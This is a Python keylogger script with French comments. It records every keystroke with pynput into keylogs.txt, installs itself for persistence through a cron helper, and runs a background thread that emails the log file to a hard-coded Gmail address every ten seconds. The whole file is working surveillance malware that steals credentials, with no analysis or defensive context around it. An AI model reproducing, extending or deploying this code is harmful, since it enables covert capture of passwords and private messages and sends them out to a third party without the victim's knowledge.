import logging
from threading import Thread
from pynput.keyboard import Key, Listener
import time
import os
from TacheProgrammees import setupCron
from EnvoiMail import sendMail

#--------DÉBUT TÂCHES PROGRAMMÉES---------------

own_file=os.path.basename(__file__)
setupCron.setupCron(own_file)

#--------FIN TÂCHES PROGRAMMÉES----------------

#--------DÉBUT PARTIE ENVOI MAIL----------------

def send():
    sendMail.send_mail(receiver_email="oussamaau123@gmail.com",
                       subject="Fichier du keylog",
                       body="Envoi du fichier keylog",
                       attachments=["keylogs.txt"])

#--------FIN PARTIE ENVOI MAIL------------------

logging.basicConfig(filename="keylogs.txt", filemode="w",
                    datefmt='%d/%m/%Y %I:%M:%S %p', format='%(asctime)s:%(message)s', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))


# Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
def mail_thread():
    while True:
        time.sleep(10) #Temps d'attente entre deux mails
        send()

# L'envoi du mail se fait sur un thread séparé
Thread(target=mail_thread, daemon=True).start()

with Listener(on_press=on_press) as listener:
    listener.join()
